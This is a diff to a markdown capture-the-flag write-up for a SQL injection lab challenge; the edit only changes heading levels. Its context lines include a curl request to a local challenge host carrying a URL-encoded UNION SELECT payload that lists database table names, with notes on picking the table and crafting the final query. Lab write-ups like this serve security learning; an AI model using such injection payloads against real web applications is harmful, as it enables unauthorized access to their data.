@@ -69,7 +69,7 @@ hacker@web-security~sqli-4:~$
 
 -------------------------------------------------------------
 
-### Since the name of the table needed to inject is unknown, first step is finding the table names and getting the right one.
+#### Since the name of the table needed to inject is unknown, first step is finding the table names and getting the right one.
 
 
 ```
@@ -78,7 +78,7 @@ curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20name%20FROM%20
 
 ------------------------------------------------------
 
-### In the results just one table was returned, so this is obviously it.
+#### In the results just one table was returned, so this is obviously it.
 
 
 ```
@@ -93,7 +93,7 @@ curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20name%20FROM%20
 
 ---------------------------------------------
 
-### Craft the UNION SELECT request with the table name:
+#### Craft the UNION SELECT request with the table name:
 
 
 ```
